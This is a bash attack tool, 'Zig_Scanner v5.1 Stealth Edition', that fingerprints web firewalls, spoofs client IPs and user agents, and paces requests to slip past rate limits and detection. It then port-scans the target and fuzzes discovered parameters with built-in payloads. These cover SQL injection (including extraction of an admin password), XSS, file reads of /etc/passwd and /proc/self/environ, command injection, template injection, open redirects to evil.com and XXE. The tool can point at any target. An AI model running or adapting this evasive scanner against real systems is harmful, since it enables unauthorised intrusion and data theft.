#!/bin/bash
# Zig_Scanner v5.1 - JDT-Mobile Stealth Edition (Adaptive Delay)

# ====== CONFIGURATION ======
RED='\033[1;31m'; GRN='\033[1;32m'; YLW='\033[1;33m'
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BLU='\033[1;34m'; CYN='\033[1;36m'; MAG='\033[1;35m'; RST='\033[0m'
LOG_DIR="$(cd "$(dirname "$0")" && pwd)/scan_logs"; mkdir -p "$LOG_DIR"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_FILE="$LOG_DIR/scan_${TIMESTAMP}.log"
REPORT_JSON="$LOG_DIR/report_${TIMESTAMP}.json"
PAYLOADS_DIR="$HOME/PayloadsAllTheThings"
PAYLOAD_LINES=()
BASELINE_SIZE=0
DISCOVERED_PARAMS=()
WAF_DETECTED="false"
RECOMMENDED_DELAY=3
TECH_STACK=""
BLOCK_COUNT=0
MAX_BLOCKS=3

# ====== CORE HELPERS ======
log() { echo -e "$1" | tee -a "$LOG_FILE"; }

center() {
    while IFS= read -r line; do
        printf "%*s\n" $(( (COLUMNS + ${#line}) / 2 )) "$line"
    done
}

# ====== STEALTH ENGINE ======
random_ua() {
    local ua_list=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0"
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
        "Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0"
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
    )
    echo "${ua_list[$RANDOM % ${#ua_list[@]}]}"
}

random_ip() {
    echo "$((RANDOM%223+1)).$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255))"
}

# Human-like adaptive delay
human_delay() {
    local base="$RECOMMENDED_DELAY"
    local jitter=$(( RANDOM % 5 ))
    local micro=$(( RANDOM % 999 ))
    local total=$(( base + jitter ))
    log "${MAG}    [~] Sleeping ${total}.${micro}s${RST}"
    sleep "${total}.${micro}"
}

# Backoff on rate limit
backoff_delay() {
    local wait="${1:-60}"
    log "${RED}    [!!!] BACKING OFF ${wait}s...${RST}"
    sleep "$wait"
}

stealth_curl() {
    local url="$1"; shift
    local ua; ua=$(random_ua)
    local ip; ip=$(random_ip)
    curl -s \
        -A "$ua" \
        -H "X-Forwarded-For: $ip" \
        -H "X-Real-IP: $ip" \
        -H "Accept-Language: en-US,en;q=0.9" \
        -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
        -H "Connection: keep-alive" \
        --connect-timeout 10 \
        --max-time 20 \
        "$@" "$url"
}

stealth_curl_metrics() {
    local url="$1"
    local ua; ua=$(random_ua)
    local ip; ip=$(random_ip)
    curl -s -o /dev/null \
        -w "%{http_code} %{size_download}" \
        -A "$ua" \
        -H "X-Forwarded-For: $ip" \
        -H "X-Real-IP: $ip" \
        -H "Accept-Language: en-US,en;q=0.9" \
        -H "Connection: keep-alive" \
        --connect-timeout 10 \
        --max-time 20 \
        "$url"
}

stealth_curl_size() {
    local url="$1"
    local ua; ua=$(random_ua)
    local ip; ip=$(random_ip)
    curl -s -o /dev/null \
        -w "%{size_download}" \
        -A "$ua" \
        -H "X-Forwarded-For: $ip" \
        -H "X-Real-IP: $ip" \
        --connect-timeout 10 \
        --max-time 20 \
        "$url"
}

# ====== PORT SCANNER ======
fast_port_scan() {
    local host="$1"
    local open_ports=()
    local ports="80,443,8080,8443,8000,8888,22,21,3306,5432,27017"
    IFS=',' read -ra port_list <<< "$ports"
    for port in "${port_list[@]}"; do
        timeout 2 bash -c "echo >/dev/tcp/$host/$port" 2>/dev/null && open_ports+=("$port")
    done
    echo "${open_ports[*]}"
}

# ====== RECON MODULE ======
recon_target() {
    local url="$1"
    local domain
    domain=$(echo "$url" | awk -F/ '{print $3}' | cut -d: -f1)

    log "\n${CYN}[+] RECON PHASE: $url${RST}"

    local headers
    headers=$(curl -sI -A "$(random_ua)" --connect-timeout 10 "$url" 2>/dev/null)

    # WAF detection — adjust delay accordingly
    if echo "$headers" | grep -qiE "cf-ray|x-waf|cloudflare|akamai|incapsula|mod_security|sucuri|imperva"; then
        WAF_DETECTED="true"
        RECOMMENDED_DELAY=8
        log "${RED}    [!] WAF DETECTED — switching to 8-13s adaptive delay${RST}"
    elif echo "$headers" | grep -qiE "x-cache|x-cdn|fastly|varnish"; then
        RECOMMENDED_DELAY=5
        log "${YLW}    [!] CDN detected — using 5-10s delay${RST}"
    else
        RECOMMENDED_DELAY=3
        log "${GRN}    [✓] No WAF detected — using 3-8s human delay${RST}"
    fi

    local server; server=$(echo "$headers" | grep -i "^Server:" | cut -d' ' -f2-)
    local powered; powered=$(echo "$headers" | grep -i "X-Powered-By:" | cut -d' ' -f2-)
    [[ -n "$server" ]] && log "${BLU}    [*] Server: $server${RST}"
    [[ -n "$powered" ]] && log "${BLU}    [*] Powered-By: $powered${RST}"

    local html
    html=$(stealth_curl "$url")
    local guess_tech=""
    echo "$headers" | grep -qi "php"       && guess_tech="${guess_tech}PHP,"
    echo "$headers" | grep -qi "asp.net"   && guess_tech="${guess_tech}ASP.NET,"
    echo "$html"    | grep -qi "sqlite"    && guess_tech="${guess_tech}SQLite,"
    echo "$html"    | grep -qi "mysql"     && guess_tech="${guess_tech}MySQL,"
    echo "$html"    | grep -qi "node\.js"  && guess_tech="${guess_tech}Node.js,"
    echo "$html"    | grep -qi "django"    && guess_tech="${guess_tech}Django,"
    echo "$html"    | grep -qi "wordpress" && guess_tech="${guess_tech}WordPress,"
    echo "$html"    | grep -qi "laravel"   && guess_tech="${guess_tech}Laravel,"
    TECH_STACK=$(echo "$guess_tech" | tr ',' '\n' | sort -u | tr '\n' ',' | sed 's/,$//')
    [[ -z "$TECH_STACK" ]] && TECH_STACK="unknown"
    log "${BLU}    [*] Tech stack: $TECH_STACK${RST}"

    local attack_rec=""
    [[ "$TECH_STACK" == *"PHP"* ]]  && attack_rec="${attack_rec}LFI/RCE,"
    [[ "$TECH_STACK" == *"SQL"* ]]  && attack_rec="${attack_rec}SQLi,"
    [[ "$TECH_STACK" == *"Node"* ]] && attack_rec="${attack_rec}SSTI,"
    [[ "$TECH_STACK" == *"ASP"* ]]  && attack_rec="${attack_rec}XSS,"
    [[ -z "$attack_rec" ]]          && attack_rec="XSS,SQLi,LFI (generic)"
    attack_rec=${attack_rec%,}
    log "${YLW}    [*] Recommended attacks: $attack_rec${RST}"

    # Anti-cloaking
    log "\n${YLW}[+] Anti-Cloaking Check...${RST}"
    local m g diff
    m=$(curl -sL -A "Mobile" --connect-timeout 5 "$url" 2>/dev/null | wc -c)
    g=$(curl -sL -A "Googlebot" --connect-timeout 5 "$url" 2>/dev/null | wc -c)
    log "    [*] Mobile: ${m}B | GoogleBot: ${g}B"
    diff=$(( m - g )); diff="${diff#-}"
    if [[ $diff -gt 1000 ]]; then
        log "${RED}    [!] ALERT: Cloaking Detected! (diff=${diff}B)${RST}"
    else
        log "${GRN}    [✓] No cloaking detected.${RST}"
    fi

    # Port scan
    # Geolocation lookup
    local resolved_ip
    resolved_ip=$(dig +short "$domain" 2>/dev/null | grep -E "^[0-9]+" | head -1)
    if [[ -n "$resolved_ip" ]]; then
        local geo country city isp
        geo=$(python3 "$(cd "$(dirname "$0")" && pwd)/checkip.py" "$resolved_ip" 2>/dev/null)
        country=$(echo "$geo" | grep '"country"' | cut -d'"' -f4)
        city=$(echo "$geo" | grep '"city"' | cut -d'"' -f4)
        isp=$(echo "$geo" | grep '"isp"' | cut -d'"' -f4)
        log "${BLU}    [*] IP: $resolved_ip | $city, $country | $isp${RST}"
    fi

    log "\n${YLW}[+] Port Scan: $domain${RST}"
    local open_ports
    open_ports=$(fast_port_scan "$domain")
    if [[ -n "$open_ports" ]]; then
        log "${GRN}    [+] Open ports: $open_ports${RST}"
    else
        log "${YLW}    [*] No common ports open (or filtered)${RST}"
    fi

    cat > "$REPORT_JSON" << JSONEOF
{
  "target": "$url",
  "timestamp": "$TIMESTAMP",
  "waf_detected": $WAF_DETECTED,
  "tech_stack": "$TECH_STACK",
  "recommended_attacks": "$attack_rec",
  "open_ports": "$open_ports",
  "recommended_delay": "${RECOMMENDED_DELAY}s"
}
JSONEOF
    log "${GRN}    [+] Recon report: $REPORT_JSON${RST}"
}

# ====== PARAM DISCOVERY ======
discover_params() {
    local url="$1"
    log "\n${YLW}[+] Discovering params from: $url${RST}"
    local raw
    raw=$(stealth_curl "$url")

    mapfile -t DISCOVERED_PARAMS < <(
        {
            echo "$raw" | grep -oE 'href="[^"]*\?[^"]*"' \
                | grep -oE '\?[^"#]*' \
                | tr '&' '\n' \
                | grep -oE '^[?]?[a-zA-Z_][a-zA-Z0-9_]*' \
                | tr -d '?'
            echo "$raw" | grep -oiE 'name="[a-zA-Z0-9_]+"' \
                | grep -oE '"[a-zA-Z0-9_]+"' \
                | tr -d '"'
            echo "$raw" | grep -oiE 'action="[^"]*\?[^"]*"' \
                | grep -oE '\?[^"#]*' \
                | tr '&' '\n' \
                | grep -oE '^[?]?[a-zA-Z_][a-zA-Z0-9_]*' \
                | tr -d '?'
        } | sort -u | grep -v '^$'
    )

    if [[ ${#DISCOVERED_PARAMS[@]} -eq 0 ]]; then
        log "${YLW}    [!] No params found — using common wordlist${RST}"
        DISCOVERED_PARAMS=(id path file page url cmd domain include src data xml view load name q search v comment redir charset callback)
    else
        log "${GRN}    [+] Found ${#DISCOVERED_PARAMS[@]} param(s): ${DISCOVERED_PARAMS[*]}${RST}"
    fi
}

# ====== BASELINE CAPTURE ======
capture_baseline() {
    local url="$1"
    local param="$2"
    local dummy_url="${url}?${param}=baseline_dummy_zig"
    BASELINE_SIZE=$(stealth_curl_size "$dummy_url")
    [[ "$BASELINE_SIZE" == "0" ]] && BASELINE_SIZE=$(stealth_curl_size "$url")
    log "${MAG}    [*] Baseline size: ${BASELINE_SIZE}B (${param}=dummy)${RST}"
}

# ====== PAYLOAD LOADER ======
load_payloads() {
    local attack_label="$1"
    PAYLOAD_LINES=()

    if [[ -d "$PAYLOADS_DIR" ]]; then
        local patt_file=""
        case "$attack_label" in
            sqli*)  patt_file=$(find "$PAYLOADS_DIR" -ipath "*SQL*Injection*" -name "*.txt" 2>/dev/null | head -1) ;;
            xss*)   patt_file="" ;;
            lfi*)   patt_file="" ;;
            rce*)   patt_file=$(find "$PAYLOADS_DIR" -ipath "*Command*Injection*" -name "*.txt" 2>/dev/null | head -1) ;;
            ssti*)  patt_file=$(find "$PAYLOADS_DIR" -ipath "*Server*Side*Template*" -name "*.txt" 2>/dev/null | head -1) ;;
            open*)  patt_file=$(find "$PAYLOADS_DIR" -ipath "*Open*Redirect*" -name "*.txt" 2>/dev/null | head -1) ;;
            xxe*)   patt_file=$(find "$PAYLOADS_DIR" -ipath "*XXE*" -name "*.txt" 2>/dev/null | head -1) ;;
        esac
        if [[ -f "$patt_file" ]]; then
            mapfile -t PAYLOAD_LINES < "$patt_file"
            log "${GRN}    [+] Loaded ${#PAYLOAD_LINES[@]} payloads from PATT: $(basename "$patt_file")${RST}"
            return
        fi
    fi

    log "${YLW}    [!] Using built-in fallback payloads.${RST}"
    case "$attack_label" in
        sqli*)
            PAYLOAD_LINES=(
                "2 OR 1=1--"
                "2 UNION ALL SELECT NULL,NULL,NULL,NULL--"
                "2 AND SLEEP(5)--"
                "' OR '1'='1"
                "admin'--"
                "2 AND SUBSTR((SELECT password FROM users WHERE name='admin'),1,1)='7'"
            ) ;;
        xss*)
            PAYLOAD_LINES=(
                "<script>alert(1)</script>"
                "<img src=x onerror=alert(1)>"
                "javascript:alert(1)"
                "\"'><script>alert(JDT_WIN)</script>"
                "0.2<script>alert(1)</script>"
                "0.2<img src=x onerror=alert(1)>"
                "0.2\"><svg onload=alert(1)>"
                "0.2<body onload=alert(1)>"
                "0.2<iframe src=javascript:alert(1)>"
            ) ;;
        lfi*)
            PAYLOAD_LINES=(
                "../../../../../../etc/passwd"
                "../../../../../../etc/hosts"
                "../../../../../../proc/self/environ"
                "/etc/passwd"
                "/etc/hosts"
                "/proc/self/environ"
                "../../../../../../data/data/com.termux/files/home/DSVW/dsvw.py"
                "DSVW/dsvw.py"
            ) ;;
        rce*)
            PAYLOAD_LINES=(
                "www.google.com; id"
                "www.google.com | id"
                "www.google.com && id"
                "www.google.com; whoami"
                "www.google.com; uname -a"
                "www.google.com; ifconfig"
            ) ;;
        ssti*)
            PAYLOAD_LINES=(
                "{{7*7}}"
                "\${7*7}"
                "#{7*7}"
                "<%= 7*7 %>"
                "{{config}}"
            ) ;;
        open*)
            PAYLOAD_LINES=(
                "http://dsvw.c1.biz"
                "//dsvw.c1.biz"
                "https://evil.com"
                "//evil.com/%2F.."
                "/%09/evil.com"
            ) ;;
        xxe*)
            PAYLOAD_LINES=(
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/version\">]><root>&xxe;</root>"
            ) ;;
        *)
            PAYLOAD_LINES=(
                "../../../../../../etc/passwd"
                "<script>alert(1)</script>"
                "2 OR 1=1--"
                "www.google.com; id"
                "{{7*7}}"
            ) ;;
    esac
    log "${YLW}    [+] Loaded ${#PAYLOAD_LINES[@]} payloads for: $attack_label${RST}"
}

# ====== HYBRID ENGINE: PYTHON BRIDGE ======
run_python_audit() {
    local target_url="$1"
    local attack_type="$2"
    [[ -z "$target_url" || "$target_url" == *"FUZZ"* ]] && return
    if [[ -f "$SCRIPT_DIR/jdt_bridge.py" ]]; then
        local result
        result=$(python3 "$SCRIPT_DIR/jdt_bridge.py" "$target_url" "$attack_type" "$BASELINE_SIZE" 2>/dev/null)
        if [[ "$result" == *"VULNERABLE"* ]]; then
            log "${RED}    [!!!] STRATEGIC HIT: $result${RST}"
        elif [[ "$result" == *"ANOMALY"* ]]; then
            log "${YLW}    [?] ANOMALY: $result${RST}"
        elif [[ "$result" == *"Skip"* ]]; then
            :
        fi
    fi
}

# ====== FUZZING ENGINE ======
fuzz_target() {
    local url_base="$1"
    local param="$2"
    local attack="$3"
    local max="${4:-20}"
    local count=0
    local url_template="${url_base}?${param}=FUZZ"

    [[ ${#PAYLOAD_LINES[@]} -eq 0 ]] && {
        log "${YLW}    [!] No payloads loaded.${RST}"
        return
    }

    capture_baseline "$url_base" "$param"
    log "\n${CYN}[+] Fuzzing: $url_template [Attack: $attack | Max: $max | Base delay: ~${RECOMMENDED_DELAY}s]${RST}"

    for p in "${PAYLOAD_LINES[@]}"; do
        [[ $count -ge $max ]] && break

        local enc
        enc=$(python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.stdin.read().strip()))" <<< "$p")
        local final_url="${url_template/FUZZ/$enc}"

        read -r code size < <(stealth_curl_metrics "$final_url")
        local diff=$(( size - BASELINE_SIZE )); diff="${diff#-}"

        # Handle response codes
        if [[ $code == "429" ]]; then
            log "${RED}    [!!!] RATE LIMITED (429) — backing off 60s${RST}"
            (( BLOCK_COUNT++ ))
            backoff_delay 60
            # Retry same payload
            read -r code size < <(stealth_curl_metrics "$final_url")
        fi

        if [[ $code == "403" || $code == "406" || $code == "444" ]]; then
            log "${RED}    [!] BLOCKED ($code) — backing off 30s${RST}"
            (( BLOCK_COUNT++ ))
            backoff_delay 30
        fi

        # Abort if blocked too many times
        if [[ $BLOCK_COUNT -ge $MAX_BLOCKS ]]; then
            log "${RED}    [!!!] Too many blocks — aborting param: $param${RST}"
            BLOCK_COUNT=0
            return
        fi

        if [[ $code == "500" ]]; then
            log "${YLW}    [HTTP 500 | SIZE ${size}B] FILE NOT FOUND: $p${RST}"
        elif [[ $code == "200" && $diff -gt 200 ]]; then
            log "${RED}    [HTTP $code | SIZE ${size}B | DIFF +${diff}B] *** ANOMALY: $p${RST}"
        else
            log "    [HTTP $code | SIZE ${size}B | DIFF ${diff}B] $p"
        fi

        run_python_audit "$final_url" "$attack"

        ((count++))
        human_delay
    done

    log "${GRN}    [✓] Fuzzing done. $count payload(s) tested.${RST}"
}

# ====== MAIN INTERFACE ======
clear
echo -e "${BLU}"
cat << 'BANNER' | center
                 ██╗      ██████╗ ██╗  ██╗███████╗
                 ██║     ██╔═══██╗╚██╗██╔╝██╔════╝
                 ██║     ██║   ██║ ╚███╔╝ ███████╗
                 ██║     ██║   ██║ ██╔██╗ ╚════██║
                 ███████╗╚██████╔╝██╔╝ ██╗███████║
                 ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
BANNER
echo -e "           Zig_Scanner v5.1 - JDT Stealth Edition${RST}"
echo "======================================================="

# Use exported target from recon_advisor if available
if [[ -n "$ZIG_TARGET" ]]; then
    target="$ZIG_TARGET"
    log "${GRN}[+] Auto-target from recon: $target${RST}"
else
    read -rp "Enter Target (e.g. 127.0.0.1:65412): " target
fi
[[ "$target" != http* ]] && target="http://$target"

# Use exported delay if available
[[ -n "$ZIG_DELAY" ]] && RECOMMENDED_DELAY="$ZIG_DELAY"

recon_target "$target"
discover_params "$target"

echo -e "\n1) SQLi  2) XSS  3) LFI  4) RCE  5) SSTI  6) Open Redirect  7) XXE"
read -rn 1 -p "Choice: " choice; echo ""

case $choice in
    1) attack="sqli" ;;
    2) attack="xss" ;;
    3) attack="lfi" ;;
    4) attack="rce" ;;
    5) attack="ssti" ;;
    6) attack="open_redirect" ;;
    7) attack="xxe" ;;
    *) log "${RED}[!] Invalid choice.${RST}"; exit 1 ;;
esac

load_payloads "$attack"

for param in "${DISCOVERED_PARAMS[@]}"; do
    fuzz_target "$target" "$param" "$attack" 20
done

log "\n${GRN}[+] Audit Complete. Log: $LOG_FILE${RST}"
log "${GRN}[+] Recon Report: $REPORT_JSON${RST}"
